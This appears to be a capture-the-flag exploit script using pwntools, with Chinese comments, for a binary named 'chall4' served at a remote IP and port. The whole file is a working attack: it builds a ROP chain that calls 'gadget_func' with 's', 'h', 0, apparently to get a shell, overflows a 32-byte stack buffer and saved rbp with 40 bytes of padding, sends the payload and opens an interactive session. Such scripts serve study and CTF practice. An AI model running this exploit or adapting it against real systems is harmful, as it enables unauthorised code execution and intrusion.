from pwn import *
# p = process("./chall4")
context.arch='amd64'
p = remote("210.28.132.84", 9004)
e = ELF("./chall4")

# 使用 pwntools.ROP 模块
rop = ROP(e)

# 栈对齐，https://github.com/Gallopsled/pwntools/issues/1870
rop.call(rop.ret)

# 目标: call gadget_func('s', 'h', 0)
# pwntools 会自动寻找 pop rdi/rsi/rdx 等gadgets来设置参数
# https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call

rop.call(e.symbols['gadget_func'], [ord('s'), ord('h'), 0])

log.info("Constructed ROP chain:\n" + rop.dump())

# 32字节缓冲区 + 8字节rbp
payload = b'A' * 40 + rop.chain()

# pause()

p.sendlineafter(b"payload: ", payload)
p.interactive()